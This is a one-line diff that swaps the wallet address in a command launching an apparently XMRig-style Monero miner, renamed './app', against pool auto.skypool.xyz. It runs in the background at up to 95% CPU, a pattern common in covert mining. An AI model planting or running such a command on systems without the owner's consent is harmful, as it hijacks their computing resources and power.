@@ -1,1 +1,1 @@
-./app --donate-level 0 -o auto.skypool.xyz:9999 -u 8889oaEpfQ2E8NygBDZbyzMEjwZPsvoGfE6j23pvJ4ZuAfk7pzZo3d88BQuBPPsF2Z7geRAQYysg4PERLB21NBXvDVyNZVU.app2 -k --tls --keepalive --background --max-cpu-usage 95
+./app --donate-level 0 -o auto.skypool.xyz:9999 -u 8AkLw69sQekFfUZNfkkV4WDR7SVwQ4ejVAdFRhCT6cQhNLGNAuE58Rbd4Uw9GobUbUPdiBjGk3x8pHmqx3Sv4rBZC9gEo5F.app2 -k --tls --keepalive --background --max-cpu-usage 95
